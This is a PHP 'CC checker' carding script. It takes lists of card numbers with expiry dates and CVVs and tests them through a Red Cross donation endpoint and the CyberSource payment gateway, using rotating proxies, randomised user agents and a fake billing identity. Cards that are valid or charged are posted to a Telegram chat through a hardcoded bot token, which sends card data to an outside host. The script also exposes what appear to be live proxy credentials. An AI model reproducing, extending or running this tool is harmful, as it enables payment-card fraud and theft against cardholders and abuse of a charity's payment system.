<?php 

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');




if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function str_between(string $string, string $start, string $end, bool $includeDelimiters = false, int &$offset = 0): ?string
{
    if ($string === '' || $start === '' || $end === '') return null;

    $startLength = strlen($start);
    $endLength = strlen($end);

    $startPos = strpos($string, $start, $offset);
    if ($startPos === false) return null;

    $endPos = strpos($string, $end, $startPos + $startLength);
    if ($endPos === false) return null;

    $length = $endPos - $startPos + ($includeDelimiters ? $endLength : -$startLength);
    if (!$length) return '';

    $offset = $startPos + ($includeDelimiters ? 0 : $startLength);

    $result = substr($string, $offset, $length);

    return ($result !== false ? $result : null);
}

function str_between_all(string $string, string $start, string $end, bool $includeDelimiters = false, int &$offset = 0): ?array
{
    $strings = [];
    $length = strlen($string);

    while ($offset < $length)
    {
        $found = str_between($string, $start, $end, $includeDelimiters, $offset);
        if ($found === null) break;

        $strings[] = $found;
        $offset += strlen($includeDelimiters ? $found : $start . $found . $end); // move offset to the end of the newfound string
    }

    return $strings;
}
//////Capture The Location Of Redirect
if (preg_match('~Location: (.*)~i', $curl, $match)) {
   $location = trim($match[1]);
}
function milliseconds() {
    $mt = explode(' ', microtime());
    return ((int)$mt[1]) * 1000 + ((int)round($mt[0] * 1000));
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function AllinOne($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};
$lista = $_GET['list'];
$guid = AllinOne();
$muid = AllinOne();
$sid = AllinOne();
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
function RandomString($length)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);
$number6 = substr($cc,0,6);
$bin = substr($cc,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function emailGenerate($length = 14)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    $serve_arr = array("@gmail.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    return ''.$randomString.''.$serv_rnd.'';
}

function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
//////////////////////////////////////////////////////////////////////////////////////////////


$firstn_number = substr($cc, 0, 1);
if ($firstn_number == 4) {
    $cyber_type = '001';
    $ccn_type = 'visa';
    $cc_type = 'VISA';
    $braintree_type = 'Visa';
    $chase_type = 'chasepaytech%3AVI';
    $firstdata_type = '0';
}
if ($firstn_number == 5) {
    $cyber_type = '002';
    $cc_type = 'Master Card';
    $ccn_type = 'mast';
    $braintree_type = 'MasterCard';
    $chase_type = 'chasepaytech%3AMC';
    $firstdata_type = '1';  
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://uddipta-bincheck.herokuapp.com/api?bin='.$bin.'&auth=UddiptaBChk231');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'referer: https://bincheck.io/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-gpc: 1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);



$binshit = json_decode($curl, TRUE);

$cardbrand = $binshit['brand'];
$cardtype = $binshit['type'];
$cardlevel = $binshit['level'];
$bankphone = $binshit['phone'];
$banksite = $binshit['website'];
$bincountry = $binshit['country'];
$bankname = $binshit['bank'];
$countryemoji = $binshit['flag'];
$currency = $binshit['currency'];                               






////////////////////////////===[Proxys]===//////////////
$navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );

$UA = $navegadoresFirefox[array_rand($navegadoresFirefox)];
$randemail = RandomString(10);
                                    
                                    
$usernameG = usernameGen();

$passwordG = passwordGen();


##################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################                               
                                    

////===[Webshare proxys for cc checker]===////



/*$Websharegay = rand(0,1000);

$rp1 = array(
1 => 'ewdoegnz-rotate:dmv1vnasu1mm',
//3 => 'hfsauacn-rotate:31tma8s2b8h0',
//4 => 'zclloral-rotate:gco8iuiyz5oq',
); 
$rpt = array_rand($rp1);
$rotate = $rp1[$rpt];
$ip = array(
1 => 'socks5://p.webshare.io:80',
2 => 'http://p.webshare.io:80',
); 
$socks = array_rand($ip);
$socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "LIVE! 🟢";
}
if (empty($ip1)){
$ip = "DEAD!:[".$rotate."]";
}

echo '[  IP: '.$ip.' ] ';*/
//////==============[End Proxy Section]==============//////


                                    


                       
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.redcross.org/api/donate/v1/transactions/creditcard');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.redcross.org';
#$headers[] = 'content-length: 1368';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'csrf-token: undefined';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.redcross.org';
$headers[] = 'x-requested-with: com.xbrowser.play';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.redcross.org/donate/donation.html/';
//$headers[] = 'accept-encoding: gzip, deflate';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'cookie: ARRAffinity=3e9a49b330654e4ac57f196a7fb95bb367210c5ce4e9c674a332fb882012a73e';
$headers[] = 'cookie: at_check=true';
$headers[] = 'cookie: LIGHTBOX_MODIFIED_HOME=undefined';
$headers[] = 'cookie: __atuvc=1%7C41';
$headers[] = 'cookie: __atuvs=6163f5daa02fed87000';
$headers[] = 'cookie: _ga=GA1.2.1363318555.1633940956';
$headers[] = 'cookie: _gid=GA1.2.1739354476.1633940956';
$headers[] = 'cookie: AMCVS_723A22C757518E2C7F000101%40AdobeOrg=1';
$headers[] = 'cookie: AMCV_723A22C757518E2C7F000101%40AdobeOrg=870038026%7CMCIDTS%7C18912%7CMCMID%7C10396483289698255530347846983754412715%7CMCAAMLH-1634545755%7C12%7CMCAAMB-1634545755%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1633948155s%7CNONE%7CvVersion%7C5.0.0';
$headers[] = 'cookie: _gcl_au=1.1.1843804764.1633940956';
$headers[] = 'cookie: s_visit=1';
$headers[] = 'cookie: s_vnum=1635705000145%26vn%3D1';
$headers[] = 'cookie: s_invisit=true';
$headers[] = 'cookie: s_lv_s=First%20Visit';
$headers[] = 'cookie: s_cc=true';
$headers[] = 'cookie: _lo_uid=68780-1633940959697-c08860f04165d0b8';
$headers[] = 'cookie: _lorid=68780-1633940959697-cc2d6c9bb8f2a66b';
$headers[] = 'cookie: _lo_v=1';
$headers[] = 'cookie: __lotl=https%3A%2F%2Fwww.redcross.org%2F';
$headers[] = 'cookie: __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)';
$headers[] = 'cookie: __utmzzses=1';
$headers[] = 'cookie: LOCATION_ZIP=20006';
$headers[] = 'cookie: LOCATION_ZIP_RECHECK=true';
$headers[] = 'cookie: REGION_CODE=09R04';
$headers[] = 'cookie: LIGHTBOX_NEW_PAGE_VISITOR=old';
$headers[] = 'cookie: mbox=session#03eb86ea275749de8cfc74a04d87507d#1633942899|PC#03eb86ea275749de8cfc74a04d87507d.31_0#1697185757';
$headers[] = 'cookie: pageNamecookie=rco:donate:donation';
$headers[] = 'cookie: gpv_pn=rco%3Adonate%3Adonation';
$headers[] = 'cookie: s_ppvl=rco%253Adonate%253Adonation%2C29%2C29%2C728%2C393%2C728%2C393%2C851%2C2.75%2CL';
$headers[] = 'cookie: da_sid=2EBC23818E32AE9E97A7AA1348380167FD|0|0|0';
$headers[] = 'cookie: da_lid=1D8F10B29A72EA0502F6BB990A3A4B6C4E|1|1|1';
$headers[] = 'cookie: da_intState=';
$headers[] = 'cookie: thx_guid=4677e4a521ca4593a41e99d05555d9ac';
$headers[] = 'cookie: AWSELB=8B3D7321165FF0E127E5C509D68BDB505BEB930A73218791B469EFBB198A3889AD9E2086347ABB7D333559C87A11C350DAB23CE93C43FC6634558F95144EF3B7ABB486E912';
$headers[] = 'cookie: AWSELBCORS=8B3D7321165FF0E127E5C509D68BDB505BEB930A73218791B469EFBB198A3889AD9E2086347ABB7D333559C87A11C350DAB23CE93C43FC6634558F95144EF3B7ABB486E912';
$headers[] = 'cookie: s_ppv=rco%253Adonate%253Adonation%2C80%2C29%2C2512%2C393%2C728%2C393%2C851%2C2.75%2CL';
$headers[] = 'cookie: s_nr=1633941357374-New';
$headers[] = 'cookie: s_lv=1633941357380';
$headers[] = 'cookie: s_sq=tanrcoprod%252Ctanrcglobalprod%3D%2526c.%2526a.%2526activitymap.%2526page%253Drco%25253Adonate%25253Adonation%2526link%253DDONATE%252520%25252410.00%2526region%253DBODY%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Drco%25253Adonate%25253Adonation%2526pidt%253D1%2526oid%253DDONATE%252520%25252410.00%2526oidt%253D3%2526ot%253DSUBMIT';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "signature": {
    "signedFields": {
      "unsigned_field_names": "card_type,card_number,card_expiry_date",
      "locale": "en",
      "transaction_type": "sale,create_payment_token",
      "amount": "10.00",
      "currency": "USD",
      "device_fingerprint_id": "fa7a9af0-b382-4cd0-9130-738e0ada7f0d",
      "payment_method": "card",
      "bill_to_forename": "Ivan",
      "bill_to_surname": "Rkbero",
      "bill_to_email": "okayfu33@gmail.com",
      "bill_to_phone": "",
      "bill_to_address_line1": "831 Bell Street",
      "bill_to_address_line2": "",
      "bill_to_address_city": "Reno",
      "bill_to_address_state": "NV",
      "bill_to_address_country": "US",
      "bill_to_address_postal_code": "89503"
    }
  },
  "receiptUrl": "https://www.redcross.org/donate/confirmation.html",
  "errorUrl": "https://www.redcross.org/donate/donation.html/",
  "designationId": 100005,
  "donationEntityId": 100018,
  "fdrInfo": {
    "microsite": "false",
    "tpf": false,
    "designationName": "Disaster Relief",
    "companyName": "",
    "sourceCode": "RSG00000E000",
    "subSourceCode": "maindefaultdonate",
    "fundCode": "4900",
    "donationEntityUrl": "/donate/donation",
    "internalDonationPageName": "donation",
    "donationLanguage": "ENGLISH",
    "premiumOptIn": "false"
  },
  "email": "okayfu33@gmail.com",
  "fdrCustomFields": []
}');
$curl = curl_exec($ch);
curl_close($ch);
//echo $curl;
$sig = trim(strip_tags(getStr($curl,'"signature":{"value":"','"')));

//echo $sig;
$devid = trim(strip_tags(getStr($curl,'"device_fingerprint_id":"','"')));

$akey = trim(strip_tags(getStr($curl,'"access_key":"','"')));
$pid = trim(strip_tags(getStr($curl,'"profile_id":"','"')));
$sdt = trim(strip_tags(getStr($curl,'"signed_date_time":"','"')));

$rno = trim(strip_tags(getStr($curl,'"reference_number":"','"')));

$tid = trim(strip_tags(getStr($curl,'"transaction_uuid":"','"')));


 $mdd4 = trim(strip_tags(getStr($curl,'"merchant_defined_data4":"','"')));
 $mdd10 = trim(strip_tags(getStr($curl,'merchant_defined_data10":"','"')));
  
 $mdd12 = trim(strip_tags(getStr($curl,'"merchant_defined_data12":"','"')));
 
# $mdd13 = trim(strip_tags(getStr($curl,'"merchant_defined_data15":"','"')));
 
 $mdd15 = trim(strip_tags(getStr($curl,'"merchant_defined_data15":"','"')));
  
  $mdd17 = trim(strip_tags(getStr($curl,'"merchant_defined_data17":"','"')));
 // $did = trim(strip_tags(getStr($curl,'"designationId":"','"')));
  
//$sc = trim(strip_tags(getStr($curl,'"sourceCode":"','"')));  
 
 
 if(substr($cc, 0, 1) == 4){



$type = "001";


}elseif(substr($cc, 0, 1) == 5){
$type = "002";
}elseif(substr($cc, 0, 1) == 3){
$type = "004";
}
else{
$type = "003";
}
  
  #2                                  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secureacceptance.cybersource.com/silent/pay');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: secureacceptance.cybersource.com';
//$headers[] = 'content-length: 2769';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'origin: https://www.redcross.org';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'x-requested-with: com.xbrowser.play';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'referer: https://www.redcross.org/';
//$headers[] = 'accept-encoding: gzip, deflate';
$headers[] = 'accept-language: en-GB,en-US;q=0.9,en;q=0.8';
$headers[] = 'cookie: __cfruid=340292ce604ac99b5d8c6ad5d0b82ffb78d0a8a4-1633934884';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'unsigned_field_names=card_type%2Ccard_number%2Ccard_expiry_date&locale=en&transaction_type=sale%2Ccreate_payment_token&amount=10.00&currency=USD&device_fingerprint_id='.$devid.'&payment_method=card&bill_to_forename=Ivan&bill_to_surname=Rkbero&bill_to_email=okayfu33%40gmail.com&bill_to_phone=&bill_to_address_line1=831+Bell+Street&bill_to_address_line2=&bill_to_address_city=Reno&bill_to_address_state=NV&bill_to_address_country=US&bill_to_address_postal_code=89503&access_key='.$akey.'&profile_id='.$pid.'&signed_date_time='.$sdt.'&reference_number='.$rno.'&transaction_uuid='.$tid.'&merchant_defined_data2=https%3A%2F%2Fwww.redcross.org%2Fdonate%2Fconfirmation.html&merchant_defined_data6=https%3A%2F%2Fwww.redcross.org%2Fdonate%2Fdonation.html%2F&merchant_defined_data4='.$mdd4.'&merchant_defined_data3=okayfu33%40gmail.com&merchant_defined_data10='.$mdd10.'&merchant_defined_data11=Disaster+Relief&merchant_defined_data12='.$mdd12.'&merchant_defined_data13=false&merchant_defined_data21=false&merchant_defined_data22=false&merchant_defined_data15='.$mdd15.'&merchant_defined_data16=maindefaultdonate&merchant_defined_data17='.$mdd17.'&merchant_defined_data18=donation&merchant_defined_data20=%2Fdonate%2Fdonation&merchant_defined_data19=ENGLISH&signed_field_names=unsigned_field_names%2Clocale%2Ctransaction_type%2Camount%2Ccurrency%2Cdevice_fingerprint_id%2Cpayment_method%2Cbill_to_forename%2Cbill_to_surname%2Cbill_to_email%2Cbill_to_phone%2Cbill_to_address_line1%2Cbill_to_address_line2%2Cbill_to_address_city%2Cbill_to_address_state%2Cbill_to_address_country%2Cbill_to_address_postal_code%2Caccess_key%2Cprofile_id%2Csigned_date_time%2Creference_number%2Ctransaction_uuid%2Cmerchant_defined_data2%2Cmerchant_defined_data6%2Cmerchant_defined_data4%2Cmerchant_defined_data3%2Cmerchant_defined_data10%2Cmerchant_defined_data11%2Cmerchant_defined_data12%2Cmerchant_defined_data13%2Cmerchant_defined_data21%2Cmerchant_defined_data22%2Cmerchant_defined_data15%2Cmerchant_defined_data16%2Cmerchant_defined_data17%2Cmerchant_defined_data18%2Cmerchant_defined_data20%2Cmerchant_defined_data19%2Csigned_field_names&card_expiry_date='.$mes.'-'.$ano.'&card_type='.$type.'&signature='.$sig.'&modf-dollar-handle=other&donation=10&modf-frequency=One+Time&payment_method=card&bill_to_forename=Ivan&bill_to_surname=Rkbero&bill_to_email=okayfu33%40gmail.com&bill_to_phone=&organizationName=&number=4479+1482+3808+0247&card_number='.$cc.'&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'&bill_to_address_line1=831+Bell+Street&bill_to_address_line2=&bill_to_address_country=US&bill_to_address_city=Reno&bill_to_address_state=NV&bill_to_address_postal_code=89503');
$result = curl_exec($ch);

#echo $curl;


$CVV  = trim(strip_tags(getStr($result,'<input type="hidden" name="auth_cv_result" id="auth_cv_result" value="','" />')));
 $msg  = trim(strip_tags(getStr($result,'<input type="hidden" name="message" id="message" value="','"')));
 $decision  = trim(strip_tags(getStr($result,'<input type="hidden" name="auth_avs_code" id="auth_avs_code" value="','" />')));
////////////////////////////===[Card Response]

if (strpos($result, 'Request was processed successfully.')) {
echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> AUTH SUCCESS CVV- '.$CVV.' AVS:  '.$decision.' MESSAGE: '.$msg.' CyraX ♛ </span></br>';
}
elseif (strpos($result, 'type="hidden" name="auth_cv_result" id="auth_cv_result" value="M" />')) {
echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★CVV- '.$CVV.' AVS: '.$decision.' MESSAGE: '.$msg.'CyraX ♛ </span></br>';
}
if (strpos($result, 'DCARDREFUSED:211:CVV2 DECLINED')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★CVV- '.$CVV.' AVS: '.$decision.' MESSAGE: '.$msg.'CyraX ♛ </span></br>';
}
if (strpos($result, 'We encountered a Paymentech problem: Reason: Credit Floor.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★AVS '.$decision.' MESSAGE: '.$msg.'CyraX ♛ </span></br>';
}
elseif(strpos($result, 'type="hidden" name="auth_cv_result" id="auth_cv_result" value="N" />')) {
  echo '<span class="badge badge-success">Reprovadas</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★ CVV- '.$CVV.' AVS: '.$decision.' MESSAGE: '.$msg.' CyraX ♛ </span></br>';
}
elseif(strpos($result, 'You are not authorized to view this page. The transaction has not been processed.')) {
  //goto $recheck;
  echo '<span class="badge badge-DANGER">Reprovadas</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★ ERROR RETRY ♛ </span></br>';
}
elseif(strpos($result, 'error code: 1020')) {
 // goto recheck;
  echo '<span class="badge badge-DANGER">Reprovadas</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★ ERROR RETRY ♛ </span></br>';
}
elseif(strpos($result, 'You are not authorized to perform this request.')) {
  //goto recheck;
  echo '<span class="badge badge-DANGER">Reprovadas</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger"> ★ ERROR RETRY ♛ </span></br>';
}
 else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-danger"> ★  '.$msg.' AVS: '.$decision.' CyraX ♛</span> </br>';
}
if(strpos($result,'Request was processed successfully.')){ 





    send_message(-1001305379587, "]  

----- Card ----- 

CARD:-  
$lista  
(CYBERSOURCE CHARGED ✅CVV) 
 
 
----- CHECKER BY ----- 

NoBoDy :- Wolf

GATEWAY =(CYBERSOURCE GATEWAY) 

ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ 
 
----------------------------------------------"); 
} 
elseif(strpos($result,  'Insufficient funds.')) { 
    send_message(-1001305379587, " 
----- Card ----- 

CARD:-  
$lista  
( ✅Insufficient funds) 
 
 
----- CHECKER BY ----- 

NoBoDy :- Wolf 

GATEWAY =(CYBERSOURCE GATEWAY) 

ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ 
 
----------------------------------------------"); 
} 

elseif(strpos($result,  'Declined for CVV failure.')) { 
    send_message(-1001305379587, "  
----- Card ----- 

CARD:-  
$lista  
(CYBERSOURCE ✅CCN) 

-----  CHECKER BY ----- 

NoBoDy :- Wolf

ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ 
 
----------------------------------------------"); 
} 
 
function send_message($chat_id, $message){ 
        $apiToken = "1843018307:AAGBsjrnLEWnXa8iQomyqqktZraPpaDUv4g"; 
        $text = urlencode($message); 
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text"); 
    }



curl_close($ch);

//unlink('cookie.txt');
